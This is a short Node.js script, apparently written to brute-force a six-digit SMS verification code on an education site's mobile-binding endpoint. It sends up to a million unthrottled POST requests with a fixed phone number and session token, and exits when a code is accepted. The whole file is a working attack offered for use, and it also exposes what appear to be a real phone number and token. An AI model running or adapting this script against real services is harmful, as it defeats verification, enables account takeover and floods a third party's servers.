const axios = require('axios');
let count = 0;

for (let i = 0; i < 1000000; i++) {
    let code = i.toString().padStart(6, '0');
    axios.request({
        method: 'POST',
        url: 'https://zuoyenew.xinkaoyun.com:30001/holidaywork/bindMobile',
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
        data: {
            mobile: '13131896660',
            code: code,
            token: 'pc_1461d9e9a2294e37a065cee7fcff0638'
        }
    }).then(function (response) {
        if (response.data.state != 'fail') {
            console.log(response.data);
            console.log(code)
            //结束程序
            process.exit();
        }
        else {
            count++;
        }
    }).catch(function (error) {
        console.error(error);
    });
}

//每五秒钟打印一次尝试次数
setInterval(() => {
    console.log(count);
}, 5000);